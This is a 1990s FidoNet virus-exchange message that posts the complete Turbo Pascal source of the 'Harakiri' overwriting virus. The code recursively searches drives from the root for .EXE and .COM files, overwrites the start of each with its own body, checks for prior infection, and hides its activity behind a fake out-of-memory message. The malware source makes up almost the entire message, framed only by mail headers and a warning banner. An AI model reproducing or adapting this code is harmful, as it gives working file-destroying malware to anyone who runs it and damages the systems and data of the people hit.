;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 19 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : HARAKIRI.PAS
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Hans Schotel, 2:283/718 (06 Nov 94 16:36)
;* To   : Dr T.
;* Subj : HARAKIRI.PAS
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Hans.Schotel@f718.n283.z2.fidonet.org
;{+--------------------------------------------------------------------+}
;{|              Harakiri Virus V1.50        91-09-01                  |}
;{| WARNING!! WARNING!! This is a virus, compiled under TP 5.5         |}
;{+--------------------------------------------------------------------+}
Uses Dos;
Const Buf_Size=25;
Var
  Buff        : Array[1..5488] of Byte;   { Antal som flyttas per gng! }
  DirInfo     : SearchRec;
  Searchfile  : String[20];
  Debug       : Boolean;
{------------------------------------------------------------------------}

Procedure Infect_File (Myfile:String);
Var
  NumRead, NumWritten   : Word;
  FromF, ToF            : File;

Begin
  Assign(FromF,ParamStr(0));            { Open output file }
  Reset(FromF, 1);                      { Record size = 1  }

  If Debug then Writeln (Myfile);
  Assign(ToF,MyFile);                   { Open output file }
  Reset(ToF, 1);                        { Record size = 1  }

  BlockRead(FromF,buff,SizeOf(Buff),NumRead);
  BlockWrite(ToF,buff,NumRead,NumWritten);

  Close(FromF);
  Close(ToF);
End;
{------------------------------------------------------------------}
Function Check_File(Myfile:String) : Boolean;
Var
  NumRead    : Word;
  NumWritten : Word;
  FromF2     : File;
  FromF      : File;
  j2         : Integer;
  j1         : Integer;
  Buf1       : Array[1..Buf_Size] of Byte;   { Antal som flyttas per gng! }
  Buf2       : Array[1..Buf_Size] of Byte;   { Antal som flyttas per gng! }

Begin
  j2:=1;
  While j2<=Buf_Size do
  begin
    Buf1[j2]:=$20;
    Buf2[j2]:=$20;
    Inc(j2);
  end;
  Check_file := False;

  Assign(FromF, ParamStr(0));      { Open input file  }
  Reset(FromF, 1);               { Record size = 1  }

  Assign (FromF2, Myfile);
  Reset (FromF2, 1);
  If Debug then Write ('--> '); If Debug then Writeln (Myfile);

  BlockRead(FromF,buf1,SizeOf(buf1),NumRead);
  BlockRead(FromF2,buf2,SizeOf(buf2),NumRead);

  j1:=1;
  While j1<=Buf_Size do
  begin
    If Buf1[j1] <> Buf2[j1] then
    begin
       If Debug then Writeln ('Ej Infekterad....!');
       j1:=10000;
       Inc (j1);
       Check_file:=True;
    end;
    Inc (j1);
  end;

  If j1>=9999 then
  begin
    Check_file:=True;
  end;
  Close (FromF); Close (FromF2);
End;

{------------------------------------------------------------------}
Procedure Search_4_File (Sdir: String);

Var
  Dir_save       : Array[1..100] of string [12];
  I,Imax         : Integer;
  Mask           : String[80];
  Attr           : Integer;
  Any_File_found : Boolean;
  New_F          : Boolean;
  Antal_Infected : Integer;

Begin
  Antal_Infected:=0;
  If Debug then Writeln('Sdir = ' ,Sdir);
  Mask := SDir + SearchFile;
  Any_File_found := False;

  FindFirst(Mask, $3F, DirInfo);

  I := 0;

  Begin
    If DosError=0 then
    begin
      I := Length( SDir );
    end;
    I := 0;
    While DosError=0 do
    begin
      If DirInfo.name[1] <> '.' then
      begin
        Any_File_found := true;
        If Debug then Writeln(Dirinfo.name);
        New_F := Check_File (SDir+DirInfo.Name);
        If New_F=True then
        begin
          If Debug then Writeln ('Infecting file');
          Infect_File (Sdir+DirInfo.Name);
          Inc (Antal_Infected);

          If Antal_Infected >= 4 then
          begin
            Writeln ('Program too big to fit in memory');
            Halt;
          end;
          If Debug then Writeln (Antal_Infected);
        end;
        If New_F=False then
        begin
          If Debug then Writeln ('File Already Infected');
        end;
      end;
      FindNext(DirInfo);
    end;  {while}
  End;

  Mask := Sdir + '*.*';
  FindFirst(Mask, Directory, DirInfo);   { look for dir only }
  Imax := 0; I:= 1;

  While DosError=0 do   { G”r lista ”ver directories..}
  Begin
    If DirInfo.Attr and Directory <> 0  then
    begin
      If DirInfo.name[1] <> '.' then
      begin
        Dir_save[I] := DirInfo.Name;
        Imax := I; inc(I);
      end;
    end;
    FindNext(DirInfo);
  End;  {while}

  I:=1;
  While I <=  Imax do
  begin
    Search_4_File(SDir + Dir_save[I] + '\');
    I:= I+1;
  end;
End;

{====Main===================================================================}
BEGIN
    Debug          := true;
    SearchFile     := '*.exe';
    Search_4_File ('\');
    SearchFile     := '*.com';
    Search_4_File ('\');

    Writeln ('Your PC is alive and infected with the HARAKIRI virus!');

END.

-+-  GoldED/386 2.50.B1016+
 + Origin: FidoNet * Mathieu Notris * Brussels-Belgium-Europe (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    þ The MeยeO

/A=NNNN       Set NewExe segment alignment factor

--- Aidstest Null: /Kill
 * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

